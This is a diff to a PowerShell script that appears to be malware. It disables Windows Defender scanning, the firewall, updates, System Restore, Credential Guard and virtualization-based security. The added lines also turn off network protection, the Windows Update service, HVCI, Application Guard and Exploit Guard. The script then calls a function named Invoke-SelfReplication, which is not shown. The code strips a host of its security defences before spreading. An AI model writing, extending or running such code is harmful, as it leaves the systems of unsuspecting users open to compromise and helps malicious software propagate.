@@ -397,6 +397,7 @@ Set-RegistryProperties -path $realTimeProtectionKey -properties @{
     "DisableScanOnRealtimeEnable" = 1
     "DisableScriptScanning" = 1
     "SubmitSamplesConsent" = 2
+    "DisableNetworkProtection" = 1
 }
 
 # Disable Windows Firewall
@@ -411,6 +412,7 @@ Set-RegistryProperties -path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Ap
 
 # Disable Automatic Updates
 Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -properties @{"NoAutoUpdate" = 1}
+Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\wuauserv" -properties @{"Start" = 4}
 
 # Disable System Restore
 Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" -properties @{"DisableSR" = 1; "DisableConfig" = 1}
@@ -462,8 +464,23 @@ Set-RegistryProperties -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion
 Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" -properties @{"LsaCfgFlags" = 0}
 Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -properties @{"LsaCfgFlags" = 0}
 
-# Disable Virtualization Based Security
-Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -properties @{"EnableVirtualizationBasedSecurity" = 0; "RequirePlatformSecurityFeatures" = 0}
+# Disable Device Guard
+Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -properties @{"EnableVirtualizationBasedSecurity" = 0; "RequirePlatformSecurityFeatures" = 0; "HVCIMATRequired" = 0}
+
+# Disable Application Guard
+Set-RegistryProperties -path "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Hvsi" -properties @{"Enabled" = 0}
+
+# Disable Windows Defender Exploit Guard
+Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard" -properties @{"EnableExploitProtection" = 0}
+
+# Disable Telemetry and Data Collection
+Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection" -properties @{"AllowTelemetry" = 0}
+
+# Disable OneDrive
+Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\OneDrive" -properties @{"DisableFileSyncNGSC" = 1}
+
+# Disable Cortana
+Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Search" -properties @{"AllowCortana" = 0}
 
 # Call the Invoke-SelfReplication function
 Invoke-SelfReplication
